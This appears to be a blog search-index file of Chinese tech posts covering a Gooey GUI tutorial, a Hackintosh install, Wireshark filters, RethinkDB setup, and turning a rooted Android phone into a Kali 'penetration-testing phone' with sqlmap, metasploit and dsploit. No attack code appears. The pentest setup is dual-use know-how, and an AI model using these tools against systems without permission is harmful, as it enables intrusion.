<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[Gooey魔法]]></title>
      <url>http://thief.one/2017/02/15/Gooey%E9%AD%94%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>　　Gooey是python的一个扩展模块，能够使用一条命令，将命令行程序变成一个 GUI 程序。它能够解析argparse模块的命令行参数，将之变成wxpython的GUI控件。当然，Gooey本身也带有命令行解析的函数—GooeyParser。下面就简单介绍Gooey的用法，以及优缺点。</p>
<h3 id="安装Gooey"><a href="#安装Gooey" class="headerlink" title="安装Gooey"></a>安装Gooey</h3><p>最简单的安装方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install Gooey</div></pre></td></tr></table></figure></p>
<p>或者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/chriskiehl/Gooey.git</div></pre></td></tr></table></figure></p>
<p>然后运行setup.py :<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python setup.py install</div></pre></td></tr></table></figure></p>
<p>相关依赖：<br>wxpython<br>安装：pip install wxpython (windows下需要去官网下载安装包)</p>
<h3 id="使用Gooey转化argparse"><a href="#使用Gooey转化argparse" class="headerlink" title="使用Gooey转化argparse"></a>使用Gooey转化argparse</h3><p>最简单的例子，将argparse参数转化为GUI控件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">from gooey import Gooey</div><div class="line">import argparse</div><div class="line"></div><div class="line">@Gooey()</div><div class="line">def main():</div><div class="line">	parser = argparse.ArgumentParser()</div><div class="line">	parser.add_argument(<span class="string">"test"</span>,<span class="built_in">help</span>=<span class="string">"this is a test"</span> )</div><div class="line">	args=parser.parse_args()</div><div class="line">	<span class="built_in">print</span> args</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure></p>
<p>运行截图：<br><img src="/upload_image/20170215/1.png" alt=""></p>
<p>说明：可以看到Gooey作为装饰器使用，Gooey()可以设置参数。</p>
<p>参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">@Gooey(advanced=Boolean,          <span class="comment"># toggle whether to show advanced config or not </span></div><div class="line">       language=language_string,  <span class="comment"># Translations configurable via json</span></div><div class="line">       show_config=True,          <span class="comment"># skip config screens all together</span></div><div class="line">       program_name=<span class="string">'name'</span>,       <span class="comment"># Defaults to script name</span></div><div class="line">       program_description,       <span class="comment"># Defaults to ArgParse Description</span></div><div class="line">       default_size=(610, 530),   <span class="comment"># starting size of the GUI</span></div><div class="line">       required_cols=1,           <span class="comment"># number of columns in the "Required" section</span></div><div class="line">       optional_cols=2,           <span class="comment"># number of columbs in the "Optional" section</span></div><div class="line">       dump_build_config=False,   <span class="comment"># Dump the JSON Gooey uses to configure itself</span></div><div class="line">       load_build_config=None,    <span class="comment"># Loads a JSON Gooey-generated configuration</span></div><div class="line">       monospace_display=False)   <span class="comment"># Uses a mono-spaced font in the output screen</span></div><div class="line">       image_dir                  <span class="comment"># Path to the diretory in which Gooey should look for custom inmages</span></div><div class="line">       language_dir               <span class="comment"># Path to the diretory in which Gooey should look for custom languages</span></div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>参数中最常用的有program_name（标题，默认为文件名），default_size(界面大小)，image_dir(ico图标地址，可以相对地址，windows下注意用反斜杠)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">@Gooey(program_name=u<span class="string">'这是一个测试脚本'</span>,default_size=(500,500))</div><div class="line">def main():</div><div class="line">	parser = argparse.ArgumentParser(description=u<span class="string">"测试描述内容"</span>)</div><div class="line">	parser.add_argument(<span class="string">"test"</span>,<span class="built_in">help</span>=<span class="string">"this is a test"</span> )</div><div class="line">	args=parser.parse_args()</div><div class="line">	<span class="built_in">print</span> args</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure></p>
<p>运行截图：<br><img src="/upload_image/20170215/2.png" alt=""></p>
<h3 id="使用GooeyParse"><a href="#使用GooeyParse" class="headerlink" title="使用GooeyParse"></a>使用GooeyParse</h3><p>简单例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">from gooey import Gooey, GooeyParser</div><div class="line"></div><div class="line">@Gooey(program_name=<span class="string">"test"</span>,image_dir=<span class="string">".\image"</span>) <span class="comment">##注意斜杠</span></div><div class="line">def main():</div><div class="line">    parser=GooeyParser(description=u<span class="string">"测试"</span>)</div><div class="line">    <span class="comment">##文本输入框</span></div><div class="line">    parser.add_argument(<span class="string">"test"</span>,<span class="built_in">help</span>=<span class="string">"this is a test"</span>)</div><div class="line">    <span class="comment">##选择框</span></div><div class="line">    parser.add_argument(</div><div class="line">     <span class="string">"test2"</span>,</div><div class="line">     metavar=<span class="string">'Should I exlode?'</span>,   <span class="comment">##描述内容</span></div><div class="line">     <span class="built_in">help</span>=<span class="string">"this is test2"</span>,         <span class="comment">##帮助内容</span></div><div class="line">     choices=[<span class="string">"Yes"</span>,<span class="string">"No"</span>],         <span class="comment">##选择框</span></div><div class="line">     default=<span class="string">"Yes"</span>                 <span class="comment">##默认值</span></div><div class="line">     )</div><div class="line">    <span class="comment">##复选框</span></div><div class="line">    parser.add_argument(</div><div class="line">       <span class="string">'-f'</span>,<span class="string">'--foo'</span>,</div><div class="line">       metavar=<span class="string">"some flag"</span>,</div><div class="line">       action=<span class="string">"store_true"</span>,        <span class="comment">##参数类型</span></div><div class="line">       <span class="built_in">help</span>=<span class="string">""</span>)</div><div class="line">    <span class="comment">##文本选择按钮</span></div><div class="line">    parser.add_argument(<span class="string">'filename'</span>, metavar=u<span class="string">"文件选择"</span>,<span class="built_in">help</span>=<span class="string">"name of the file to process"</span>, widget=<span class="string">'FileChooser'</span>) <span class="comment">#文本选择按钮</span></div><div class="line">    parser.add_argument(<span class="string">'datetime'</span>, metavar=u<span class="string">"时间选择"</span>,<span class="built_in">help</span>=<span class="string">"date to process"</span>,widget=<span class="string">'DateChooser'</span>,default=<span class="string">"2017-02-15"</span>) <span class="comment">#时间选择按钮</span></div><div class="line">    args=parser.parse_args()</div><div class="line">    <span class="built_in">print</span> args</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">     main()</div></pre></td></tr></table></figure></p>
<p>运行截图：<br><img src="/upload_image/20170215/3.png" alt=""><br>说明：image_dir设置为当前目录下image目录，则程序会去image目录下寻找相应的图片来覆盖默认的图片，因此覆盖的图片名字必须为默认的图片名;可以看到运行界面上分为Required Arguments与Optional Arguments参数，代码中’test’对应前者，’-test’对应后者；metavar表示描述信息；action表示控件类型；help为帮助信息；widget为小工具；default为默认内容。</p>
<p>image目录下图片文件名，分别用来覆盖界面上的图片：</p>
<ul>
<li>program_icon.ico  　　ico图标</li>
<li>success_icon.png  　　运行成功的图标</li>
<li>running_icon.png  　　正在运行时的图标</li>
<li>loading_icon.gif  　　加载时的图标</li>
<li>config_icon.png   　　配置图片</li>
<li>error_icon.png    　　出错时的图片</li>
</ul>
<p>action内容表示参数类型，分别对应着wxpython相应的控件：</p>
<ul>
<li>store 　　TextCtrl</li>
<li>store_const 　　CheckBox</li>
<li>store_true  　　CheckBox</li>
<li>store_False 　　CheckBox</li>
<li>append      　　TextCtrl</li>
<li>count       　　DropDown</li>
<li>Mutually Exclusive Group  　　RadioGroup</li>
<li>chooice     　　DropDown</li>
</ul>
<p>除了action之外，Gooey还提供了一些小工具（Widgets）</p>
<ul>
<li>DirChooser   　　目录选择按钮工具</li>
<li>FileChooser  　　文件选择按钮工具</li>
<li>DateChooser  　　时间选择按钮工具</li>
</ul>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>　　说说个人使用的一点总结，优点是方便，无需太多的代码，也免去了界面设计。缺点是不太适合操作非常复杂的程序，且目前支持的控件不多。额外一点，在打包程序时，会有很多Bug，有待解决。</p>
<p>参考文档：<br>GitHub地址:<a href="https://github.com/chriskiehl/Gooey" target="_blank" rel="external">https://github.com/chriskiehl/Gooey</a><br>官方例子：<a href="https://github.com/chriskiehl/GooeyExamples/tree/master/examples" target="_blank" rel="external">https://github.com/chriskiehl/GooeyExamples/tree/master/examples</a><br>官方文档：<a href="https://github.com/chriskiehl/Gooey#how-does-it-work" target="_blank" rel="external">https://github.com/chriskiehl/Gooey#how-does-it-work</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[联想Z470黑化之路]]></title>
      <url>http://thief.one/2017/02/13/%E8%81%94%E6%83%B3Z470%E9%BB%91%E8%8B%B9%E6%9E%9C%E6%95%99%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>　　11年入手了一台联想Z470，到现在也有些年头了，当年是看中了它的外观，现在想来性能是它的短板。然而为了工作需要，我便又购置了一台高性能电脑。现如今便想着怎么处理这台小Z，有人建议当废品出售，但无论如何它都跟了我这么多年，舍弃有些不忍。抱着勤俭持家的态度，我便狠了狠心决定多花点钱，将它全面更新升级。在上网找了些资料后，便开始整理思路，汇总如下：</p>
<ul>
<li>更新内容：将原有部分硬件换新（声卡、网卡、外壳、键盘等）</li>
<li>升级内容：内存加到8G，添加固态硬盘</li>
<li>系统更换：黑化之苹果系统</li>
</ul>
<p>　　这其中最繁琐的要数装黑苹果系统，技术含量比较高，前2个比较好实现（只要花钱）。有了目标，便开始淘宝购买物件吧，前后大概花了800多，终于凑齐了所有所需之物，好了，那么便开始吧！</p>
<h3 id="更换升级零件"><a href="#更换升级零件" class="headerlink" title="更换升级零件"></a>更换升级零件</h3><p>　　对于物件更换，这里不多介绍，只要会拆机就行，拆机之前多上网查查机型，根据教程来，不要盲目拆机。<br>　　加内存条也比较简单，也是先查询机型兼容的内存条型号，购买相应的装入即可。<br>　　至于安装SSD（固态硬盘），我的做法是将光驱拆下，将原有的机械硬盘放到光驱（需要购买托盘），再将SSD装入原先机械硬盘处即可。<br>　　以上一切做完之后，小Z已经从硬件上进行了全面大升级（显卡跟CPU不建议更改，可能会使主板损坏，其提升效果不明显）。接下来就是本文重点，更换苹果系统。</p>
<h3 id="安装黑苹果"><a href="#安装黑苹果" class="headerlink" title="安装黑苹果"></a>安装黑苹果</h3><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><ul>
<li>第一：上网查资料，上网查资料，上网查资料。。。。。重要的事情多说几遍，要学会自己查找答案。</li>
<li>第二：查找对应机型的电脑是否有安装黑苹果成功的案例，如果没有，那么我觉得是时候放弃了（除非是专门研究黑苹果的技术男，不然不要轻易去试）。我算运气比较好的，上网查了一圈，发现有不少小Z安装黑苹果成功的案例。</li>
<li>第三：根据网上成功的教程，下载好所需的软件，复制网上成功的路线。<br>  所需软件：<ul>
<li>变色龙引导程序</li>
<li>懒人版镜像</li>
<li>硬盘助手</li>
<li>HFS</li>
<li>DiskGenius Pro 4.30</li>
<li>……</li>
</ul>
</li>
</ul>
<p>准备工作都弄好了，那么可以开始动手干了！</p>
<h5 id="安装变色龙引导程序"><a href="#安装变色龙引导程序" class="headerlink" title="安装变色龙引导程序"></a>安装变色龙引导程序</h5><p><img src="/upload_image/20170213/1.png" alt=""><br>以管理员身份打开：<br><img src="/upload_image/20170213/2.png" alt=""><br>　　如果点击安装，没有反应，则需要打开电脑磁盘管理（右击计算机，管理），给那个100M的隐藏磁盘分配盘符（注意不能分配A盘符，其余的盘符都可以分配），分配完后，重新打开变色龙安装程序，重新安装。安装完成后，会在C盘或者100M的系统隐藏盘生成3个隐藏文件。<br><img src="/upload_image/20170213/3.png" alt=""><br>这3个文件是变色龙的引导文件。</p>
<h5 id="安装HFS"><a href="#安装HFS" class="headerlink" title="安装HFS"></a>安装HFS</h5><p><img src="/upload_image/20170213/4.png" alt=""><br>直接双击运行，一路安装，具体作用自行百度吧。</p>
<h5 id="给电脑分区"><a href="#给电脑分区" class="headerlink" title="给电脑分区"></a>给电脑分区</h5><p>首先分配一个8G大小的区，注意不要格式化。（用来放OSX安装程序，相当于硬盘安装盘）<br>然后再分配个大小不上限的区，注意不要格式化。（用来安装OSX，相当于windows的C盘）</p>
<h5 id="打开硬盘助手"><a href="#打开硬盘助手" class="headerlink" title="打开硬盘助手"></a>打开硬盘助手</h5><p><img src="/upload_image/20170213/5.png" alt=""><br>将下载好的系统盘（我用的是懒人版，7.5G大小），写入刚分配好的8G大小的磁盘中，需要等到几分钟。。。</p>
<h5 id="DiskGenius-Pro-4-30（查看磁盘状态工具）"><a href="#DiskGenius-Pro-4-30（查看磁盘状态工具）" class="headerlink" title="DiskGenius Pro 4.30（查看磁盘状态工具）"></a>DiskGenius Pro 4.30（查看磁盘状态工具）</h5><p><img src="/upload_image/20170213/6.png" alt=""><br>将刚才分的2个磁盘（8G，不上限大小），标识都设置为AF。右击更改参数，直接改为AF。</p>
<h5 id="将EFI文件放入安装盘根目录"><a href="#将EFI文件放入安装盘根目录" class="headerlink" title="将EFI文件放入安装盘根目录"></a>将EFI文件放入安装盘根目录</h5><p><img src="/upload_image/20170213/7.png" alt=""><br>即放在那个8G大小的盘根目录。<br>注意：如果打开资源管理器，看不到8G的那个磁盘，可以重启电脑再看看。实在没有，估计是磁盘分区有问题，可能就需要重装系统了。</p>
<h5 id="EDID注入"><a href="#EDID注入" class="headerlink" title="EDID注入"></a>EDID注入</h5><p>EFI下面有一个config.split文件，需要替换成自己电脑的edid（替换方法自行百度），这个文件是clover引导的配置文件，至关重要。</p>
<h5 id="将Clover-iso替换wowpc-iso"><a href="#将Clover-iso替换wowpc-iso" class="headerlink" title="将Clover.iso替换wowpc.iso"></a>将Clover.iso替换wowpc.iso</h5><p>将clover.iso重命名为wowpc.iso，然后替换C盘或者隐藏盘下的wowpc.iso。这样变色龙引导会直接跳转到clover引导。</p>
<h4 id="安装阶段"><a href="#安装阶段" class="headerlink" title="安装阶段"></a>安装阶段</h4><p>　　安装的过程中，最主要的是看会不会卡logo，或者黑屏。如果出现这2种情况，绝大部分原因是config.split配置文件的问题。如果一切正常，那么会成功进入安装界面，在选择安装到哪个盘时，要先选择菜单栏上的磁盘工具找到那个分配的准备拿来存放OSX系统的磁盘，选择抹掉，格式为OS（日志格式），再回到安装界面，就会发现可以选择那个磁盘进行安装了。</p>
<h4 id="驱动配置"><a href="#驱动配置" class="headerlink" title="驱动配置"></a>驱动配置</h4><p>　　等到安装完成，就差不多可以用了，但是无线网卡驱动跟声音驱动还没有弄好。<br>　　安装无线网卡驱动：改无线网卡2a为2b，方法为finder进10.11系统盘system/library/extensions/,找到IO82011Family.kext，右键显示包内容找到/contents/Pluglus/AirportAtheros40.kext，继续右键显示包内容，找到contents/Info.pilst，用plistEdit Pro（自行百度安装该软件）打开，找到：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;array&gt;</div><div class="line">        &lt;string&gt;pci168c,30&lt;/string&gt;</div><div class="line">        &lt;string&gt;pci168c,2a&lt;/string&gt;</div><div class="line">        &lt;string&gt;pci106b,0086&lt;/string&gt;</div><div class="line">        &lt;string&gt;pci168c,1c&lt;/string&gt;</div><div class="line">        &lt;string&gt;pci168c,23&lt;/string&gt;</div><div class="line">        &lt;string&gt;pci168c,24&lt;/string&gt;</div><div class="line">&lt;/array&gt;</div></pre></td></tr></table></figure></p>
<p>代码，将第三行里面的2a改为2b，保存退出，之后用KCPM Utility Pro.app修复重建缓存<br>，重启。重启之后无线网卡应该能成功驱动了。<br>　　安装声卡驱动：即AppleHDA.kext驱动，删除system/library/extensions/AppleHDA.kext后，用KCPM Utility Pro进行安装，路径也为system/library/extensions/，安装完成之后重建缓存即可。</p>
<h4 id="截图见证"><a href="#截图见证" class="headerlink" title="截图见证"></a>截图见证</h4><p><img src="/upload_image/20170213/8.png" alt=""><br><img src="/upload_image/20170213/9.png" alt=""></p>
<p><em>提醒：以上过程只适用于联想Z470，其他机型请上网查资料……</em></p>
<p>参考：<a href="http://bbs.pcbeta.com/viewthread-1662315-1-1.html" target="_blank" rel="external">远景论坛</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[安卓版Kali-linux]]></title>
      <url>http://thief.one/2017/02/10/%E5%AE%89%E5%8D%93%E7%89%88Kali-linux/</url>
      <content type="html"><![CDATA[<p>　　据说OPPO拍照神器最近很火，于是便凑热闹买了一款（R9s），外形不错，性能说得过去。尤其是自拍功能爱不释手（……），于是手头原本的小米便闲置了出来。作为一名崇尚节俭持家的技术男，当然是要废物利用一番，于是便有了以下的一番折腾。<br>　　我的目的是打造一款渗透测试专用手机，最先想到的方案是在手机上安装kali-linx系统，因为该系统集成了很多渗透测试工具，解决了很多依赖问题，省去不少麻烦。那么问题来了，怎么在手机上安装kali-linux系统呢？在查找了一些资料之后，我理了理思路：<br>（1）手机需要root<br>（2）手机上安装linux-deploy<br>（3）在linux-deploy上安装kali<br>（4）在kali里面安装渗透测试工具<br>思路有了，那么让我们撸起袖子干起来吧！(以下提到的安装包会在文章最后提供下载！)</p>
<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>　　起初看到网上的一些教程，介绍root手机非常简单，下载第三方软件，便可一键root。于是抱着轻松地态度在电脑上下载了一款软件（root精灵），接着将手机连上电脑，便开始点击一键root了。过了几分钟提示root成功，心想，原来破解手机这么简单，刚想吐槽小米，打开手机便发现根本没有root成功，NM坑爹。然后卸载了此软件，又重新找了一款（root大师），结果同样如此。<br>　　心中默默骂了几条街后，喝口水冷静了会，重新上网搜索资料，竟然无意看到了小米官方提供开发者版本的安装包（晕倒，所以不能盲目使用第三方软件，一般厂商会给出相应的软件或者安装包）。<br>　　官方下载地址：<a href="http://www.miui.com/download-241.html" target="_blank" rel="external">http://www.miui.com/download-241.html</a><br>　　根据官方提供的教程安装即可（我选择了第二种安装方式），安装完以后在安全中心授予应用程序root权限，其他品牌的手机请自行百度，方法大同小异。</p>
<h3 id="安装linux-deploy"><a href="#安装linux-deploy" class="headerlink" title="安装linux-deploy"></a>安装linux-deploy</h3><p>　　Linux deploy是一个可以快速在Android设备上安装运行Linux操作系统的App,遵循GPLv3协议，运行需要root权限。linux-deploy软件介绍：<a href="http://www.cnblogs.com/mzlw/p/4841707.html" target="_blank" rel="external">http://www.cnblogs.com/mzlw/p/4841707.html</a><br>在手机上安装完linux-deploy，运行后进行配置：<br><img src="/upload_image/20170210/3.png" alt=""><br>运行界面如上图所示，点击右下角进行配置：<br><img src="/upload_image/20170210/1.png" alt=""><br>发行版选择：kali-linux；源地址选择国内镜像：<a href="http://202.141.160.110/kali/" target="_blank" rel="external">http://202.141.160.110/kali/</a><br><img src="/upload_image/20170210/2.png" alt=""><br>勾选上ssh,vnc，在启动系统后会自动开启ssh以及vnc服务，方便远程管理。<br>配置完成后点击安装，等待一会。<br><img src="/upload_image/20170210/4.png" alt=""><br>安装完以后点击启动，如若成功，便可以用ssh工具连接此系统。<br><img src="/upload_image/20170210/6.png" alt=""></p>
<p>注：linux-deploy只是一款软件，安装它对应手机本身不会造成什么影响（除了占用存储空间），也不会清空数据（不是刷机）</p>
<p>linux-deploy安装kali参考：<br><a href="http://www.freebuf.com/articles/terminal/13209.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/13209.html</a><br><a href="http://www.freebuf.com/articles/terminal/47817.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/47817.html</a></p>
<h3 id="kali上安装渗透工具"><a href="#kali上安装渗透工具" class="headerlink" title="kali上安装渗透工具"></a>kali上安装渗透工具</h3><p>　　虽然手机上安装kali成功了，但是此kali系统上并没有任何工具，需要自己安装。因为kali官方的源太慢了，因此建议更换国内的源。手机上安装一个ssh远程连接工具，连接上kali系统，并输入以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/apt/sources.list</div></pre></td></tr></table></figure></p>
<p>清空文件内容并添加以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">deb http://202.141.160.110/kali/ kali-rolling main contrib non-free</div><div class="line">deb-src http://202.141.160.110/kali kali-rolling main contrib non-free</div></pre></td></tr></table></figure></p>
<p>更换完以后，更新源：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo su       <span class="comment">#切换到root用户</span></div><div class="line">apt-get update</div><div class="line">apt-get upgrade</div></pre></td></tr></table></figure></p>
<p>安装工具：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">apt-get install nmap</div><div class="line">apt-get install sqlmap</div><div class="line">apt-get install metasploit-framework</div><div class="line">......</div></pre></td></tr></table></figure></p>
<p>运行截图：<br><img src="/upload_image/20170210/5.png" alt=""><br><em>运行速度还行，方便携带，居家旅行必备神器！</em></p>
<h3 id="其他安全工具"><a href="#其他安全工具" class="headerlink" title="其他安全工具"></a>其他安全工具</h3><p>　　除了在安卓手机上安装kali系统以外，很多安全软件也支持安卓系统，比如dsploit、busybox、nmap for android等。首先在手机上安装busybox软件（授予root权限），运行软件以后勾选上智能安装选项，然后点击安装busybox。安装完busybox后，才可以使用dsploit等软件，当然这些软件也都是需要root权限的。至于这些安全软件的用法，网上一搜一大推，这里便不再介绍了。</p>
<h3 id="软件工具下载"><a href="#软件工具下载" class="headerlink" title="软件工具下载"></a>软件工具下载</h3><p>链接: <a href="https://pan.baidu.com/s/1miqcGjQ" target="_blank" rel="external">https://pan.baidu.com/s/1miqcGjQ</a>  密码: ch5f</p>
<center><em>有时候折腾仅仅只是为了折腾，仅此而已！</em></center>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[WireShark过滤规则]]></title>
      <url>http://thief.one/2017/02/09/WireShark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/</url>
      <content type="html"><![CDATA[<p>　　wireshark是一款网络流量抓取分析神器，也是安全工具使用排行中排名第一的工具。使用wireshark必须要牢记一些常用的数据包过滤规则，对于寻找一些特定的包会事半功倍。</p>
<h3 id="IP过滤"><a href="#IP过滤" class="headerlink" title="IP过滤"></a>IP过滤</h3><p>ip源地址：　　ip.src　　　　ip.src==10.0.3.109<br>ip目的地址: 　　ip.dst　　　　ip.dst==10.0.3.114</p>
<h3 id="端口过滤"><a href="#端口过滤" class="headerlink" title="端口过滤"></a>端口过滤</h3><p>tcp.port==80　　　　所有端口为80的包<br>tcp.dstport==80　　　目的端口为80的包<br>tcp.srcport==80　　　源端口为80的包</p>
<h3 id="协议过滤"><a href="#协议过滤" class="headerlink" title="协议过滤"></a>协议过滤</h3><p>http<br>tcp<br>icmp<br>…….</p>
<h3 id="http模式过滤"><a href="#http模式过滤" class="headerlink" title="http模式过滤"></a>http模式过滤</h3><p>http.request.method==”GET”　　查找GET包<br>http.request.method==”POST”　　查找POST包</p>
<h3 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a>连接符</h3><p>and　　&amp;<br>or　　||</p>
<h3 id="自助模式"><a href="#自助模式" class="headerlink" title="自助模式"></a>自助模式</h3><p>可以打开wireshark的Expression会弹出Filter Expression窗口：<br><img src="/upload_image/20170209/1.png" alt=""></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Rethinkdb搭建与使用]]></title>
      <url>http://thief.one/2017/02/07/rethinkdb%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>　　首先惊喜rethinkdb开源了，为开源精神点赞（无论背后是哪种原因）……既然如此，就来介绍一下Nosql界的黑科技–rethinkdb吧。我与rethibkdb相识于16年夏，因为一个项目的需要，当时徘徊于mongodb与rethinkdb之间，但最终还是选择了rethinkdb，两者之间的好坏暂且不论，我也只是用其一点皮毛，这里结合自身使用以及官方介绍简单记录一番。<br>　　rethinkdb属于Nosql数据库，它具有可视化管理，支持多平台等优点，如果我们需要实时的数据时，它是最为合适的。当然在使用过程中，我也发现了一点它的一点缺陷，不支持多线程储存（很有可能是因为我没有用好，当时时间紧迫，也没来得及去解决，如有解决方案，期望告知一二）。<br>详细介绍请参考：<a href="https://rethinkdb.com/faq/" target="_blank" rel="external">https://rethinkdb.com/faq/</a></p>
<p>rethinkdb分为server与client，server端也就是搭建的rethinkdb数据库，用于储存以及提供服务；clinet是用来连接操作数据库内容的，支持多种编程语言。</p>
<h3 id="Server端安装使用"><a href="#Server端安装使用" class="headerlink" title="Server端安装使用"></a>Server端安装使用</h3><p>server安装支持平台：linux，windows，mac</p>
<h4 id="ubuntu安装"><a href="#ubuntu安装" class="headerlink" title="ubuntu安装"></a>ubuntu安装</h4><p>直接使用apt-get安装：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> /etc/lsb-release &amp;&amp; <span class="built_in">echo</span> <span class="string">"deb http://download.rethinkdb.com/apt <span class="variable">$DISTRIB_CODENAME</span> main"</span> | sudo tee /etc/apt/sources.list.d/rethinkdb.list</div><div class="line">wget -qO- https://download.rethinkdb.com/apt/pubkey.gpg | sudo apt-key add -</div><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install rethinkdb</div></pre></td></tr></table></figure></p>
<p>运行rethinkdb服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ rethinkdb</div><div class="line">info: Creating directory /home/user/rethinkdb_data</div><div class="line">info: Listening <span class="keyword">for</span> intracluster connections on port 29015</div><div class="line">info: Listening <span class="keyword">for</span> client driver connections on port 28015</div><div class="line">info: Listening <span class="keyword">for</span> administrative HTTP connections on port 8080</div><div class="line">info: Server ready</div></pre></td></tr></table></figure></p>
<p>其他安装方式请参考：<a href="https://rethinkdb.com/docs/install/ubuntu/" target="_blank" rel="external">https://rethinkdb.com/docs/install/ubuntu/</a></p>
<h4 id="windows安装"><a href="#windows安装" class="headerlink" title="windows安装"></a>windows安装</h4><p>下载安装包：<br><a href="https://download.rethinkdb.com/windows/rethinkdb-2.3.5.zip" target="_blank" rel="external">https://download.rethinkdb.com/windows/rethinkdb-2.3.5.zip</a><br>运行rethinkdb程序：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">C:\Users\Slava\&gt;<span class="built_in">cd</span> RethinkDB</div><div class="line">C:\Users\Slava\RethinkDB\&gt;</div><div class="line">C:\Users\Slava\RethinkDB\&gt;rethinkdb.exe</div></pre></td></tr></table></figure></p>
<p>注意：运行rethinkdb数据库后，默认开启8080端口，访问localhost:8080展示的web页面用来管理数据库；默认开启29015端口，用来连接客户端交互数据。<br>web管理页面：<br><img src="/upload_image/20170207/1.png" alt=""></p>
<h3 id="Client端安装使用"><a href="#Client端安装使用" class="headerlink" title="Client端安装使用"></a>Client端安装使用</h3><p>Client端支持编程语言：javascript，ruby，python，java，这里以python举例。</p>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><h5 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo pip install rethinkdb</div></pre></td></tr></table></figure>
